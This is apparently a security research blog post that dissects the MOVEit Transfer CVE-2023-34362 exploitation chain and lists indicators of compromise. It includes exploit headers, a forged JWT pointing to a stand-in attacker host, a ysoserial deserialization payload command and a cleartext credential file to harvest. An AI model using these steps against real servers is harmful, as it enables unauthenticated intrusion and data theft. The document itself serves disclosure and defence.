# MOVEit Transfer CVE-2023-34362 Deep Dive and Indicators of Compromise (Horizon3.ai)

**Source URL:** https://horizon3.ai/attack-research/attack-blogs/moveit-transfer-cve-2023-34362-deep-dive-and-indicators-of-compromise/
**CVE:** CVE-2023-34362
**Fetched:** 2026-05-19
**Source type:** blog

---

## Executive Summary

Critical SQL injection vulnerability in Progress MOVEit Transfer, exploited in-the-wild as a 0-day. Attributed to the **Cl0p ransomware gang**, the same group behind PaperCut, GoAnywhere MFT, SolarWinds Serv-U, and Accellion FTA campaigns.

The full exploitation chain requires chaining authentication bypass, session variable injection, SQL injection, federated authentication abuse, and .NET deserialization to achieve unauthenticated remote code execution.

---

## Vulnerability Overview

| Field | Value |
|---|---|
| CVE | CVE-2023-34362 |
| Product | Progress MOVEit Transfer |
| Class | SQL injection leading to remote code execution |
| Disclosure | 2023-05-31 |
| Threat actor | Cl0p ransomware gang |

---

## Phase 1 — Authentication Bypass via Header Smuggling

### Target Endpoint
`/moveitisapi/moveitisapi.dll?action=m2`

### Header Parsing Bug

The header extraction function in `MOVEitISAPI.dll` incorrectly extracts headers that *end* in `X-siLock-Transaction`. By providing a malformed header with extra prefix bytes, an attacker can register an arbitrary value through the header parser while supplying a second clean `X-siLock-Transaction` header.

### Exploit Headers
```
xX-siLock-Transaction: folder_add_by_path
X-siLock-Transaction: session_setvars
```

### Key Functions
- `action_m2()` — Parses requests with `action=m2` query parameter. Located at offset `0x180080920` in `MOVEitISAPI.dll`.
- `machine2.aspx` — Backend endpoint that receives relayed requests from the ISAPI module. Normally restricted to localhost, but reachable through the relay.

---

## Phase 2 — Session Variable Injection

### Target Function (removed in patch)
`SetAllSessionVarsFromHeaders()`

When invoked with `transaction=session_setvars`, this function parses all request headers and, for any header starting with `X-siLock-SessVar`, sets the corresponding session variable. Injected variables bypass the `XHTMLClean()` sanitizer used on user-supplied input.

### Example Injection Header
```
X-siLock-SessVar0: MyUsername: sysadmin
```

### Companion Function
`LoadFromSession()` — Loads previously set session variables at the start of `guestaccess.aspx` request processing.

### Injectable Session Variables (Unsanitized)
- `MyUsername`
- `MyPkgValidationCode`
- `MyInstMessaging`
- `MyGuestEmailAddr`
- `MyPkgID`
- `MyPkgSelfProvisionedRecips`
- `MyPkgAccessCode`
- `MyPkgInstID`

---

## Phase 3 — SQL Injection via Guest Access

### Target Endpoint
`/guestaccess.aspx?Transaction=secmsgpost`

### Vulnerable Function
`UserGetUsersWithEmailAddress()` — Concatenates the `SelfProvisionedRecips` session variable directly into a SQL query without sanitization.

### Call Chain
```
guestaccess.aspx
  → SILGuestAccess
  → SILGuestAccess.PerformAction()
  → MsgEngine.MsgPostForGuest()
  → UserEngine.UserGetSelfProvisionUserRecipsWithEmailAddress()
  → UserEngine.UserGetUsersWithEmailAddress()
```

The `SelfProvisionedRecips` variable injected in Phase 2 (originally from `MyPkgSelfProvisionedRecips`) is never cleaned before being inserted.

### SQL Query Structure
```sql
SELECT Username, Permissions, LoginName, Email FROM users
WHERE InstID=9389 AND Deleted=0
  AND (Email='<EmailAddress>'
       OR Email LIKE (%EscapeLikeForSQL(<EmailAddress>))
       OR Email LIKE (EscapeLikeForSQL(<EmailAddress>));
```

### Payload Constraint
`SelfProvisionedRecips` is split on commas, so payloads must use sequential statements (INSERT, then UPDATE) instead of comma-separated tuples.

---

## Phase 4 — Federated Authentication Abuse

### Objective
Obtain a sysadmin API access token by inserting attacker-controlled federated-auth configuration via the SQL injection from Phase 3.

### Authentication Endpoint
`/api/v1/auth/token` with `session_grant=external_token`, handled by `MOVEit.DMZ.WebAPI.GrantTokenFromExtenralToken()`.

### Forged JWT (RS256)
```json
{
  "sub": "sysadmin",
  "amurl": "attacker.com/cert",
  "x5t": "thumbprint"
}
```

### SQL-Injection Operations Required
1. Insert into `trustedexternaltokenproviders` pointing to `attacker.com/cert`
2. Insert into `userexternaltokens` binding the JWT to the sysadmin user
3. Insert into `hostpermits` to permit login from the attacker IP
4. Present the crafted RS256 JWT to `/api/v1/auth/token`
5. Receive a valid sysadmin access token

### Tables Modified by Attacker
- `userexternaltokens`
- `trustedexternaltokenproviders`
- `hostpermits`

---

## Phase 5 — Remote Code Execution via Deserialization

### Endpoints
- `GET /api/v1/folders` — List folders (retrieve `FolderID`)
- `POST /api/v1/folders/<folder_id>/files?uploadType=resumable` — Initiate upload, receive `FileID`
- `POST /api/v1/folders/<folder_id>/files?uploadType=resumable&fileId=<file_id>` — Resume upload (triggers deserialization)

### Vulnerable Function
`GetFileUploadInfo()` — Reads the `State` column from the `fileuploadinfo` table and triggers `BinaryFormatter.Deserialize()` on the bytes.

### Vulnerable Code
```csharp
BinaryFormatter().Deserialize(uploadState)
```

### Exploitation Steps
1. Create file upload supplying a base-64 encoded .NET serialized payload as the `Comment` parameter
2. Via SQL injection, copy the `Comment` field to the `State` field in `fileuploadinfo`
3. Resume the upload — the resumed upload path calls `BinaryFormatter.Deserialize(State)`
4. Code execution occurs in the MOVEit service account context

### Payload Generation
```bash
ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "cmd.exe /C <command>" -o base64
```

### Database Table
`fileuploadinfo` — Contains the `State` column targeted for poisoning.

---

## Post-Exploitation

### Credential Harvesting File
`C:\MOVEitDMZ_Install.INI`

Contains in cleartext (used for unattended installs, often left behind):
- Provisioned sysadmin account credentials
- Database credentials
- Service account credentials

---

## Indicators of Compromise

### Database Anomalies
- `userexternaltokens` — Unauthorized external token entries
- `trustedexternaltokenproviders` — Unauthorized identity providers
- `hostpermits` — Unexpected IP allowlist entries
- `fileuploadinfo` — Modified `State` fields with serialized bytes

### Application Log Files
- `<InstallDir>/Logs/DMZ_WebApi.log` — `/api/v1/*` endpoint access
- `<InstallDir>/Logs/DMZ_WEB.log` — `/guestaccess.aspx` and `/machine2.aspx` access
- `<InstallDir>/Logs/DMZ_ISAPI.log` — `/moveitisapi/moveitisapi.dll?action=m2` access

### Network Indicators
- Requests to `/moveitisapi/moveitisapi.dll?action=m2`
- Requests with malformed `xX-siLock-Transaction` headers
- Requests with `X-siLock-SessVar*` headers
- Multiple unauthenticated `/api/v1/auth/token` requests
- Resume-upload requests `/api/v1/folders/<folder_id>/files?uploadType=resumable&fileId=<file_id>`

---

## References
- Horizon3 GitHub Proof of Concept: https://github.com/horizon3ai/CVE-2023-34362
- Progress Security Advisory (May 31, 2023): community.progress.com
- GreyNoise: scanning activity observed 90 days prior to disclosure
- Kroll: similar TTPs traced to 2021
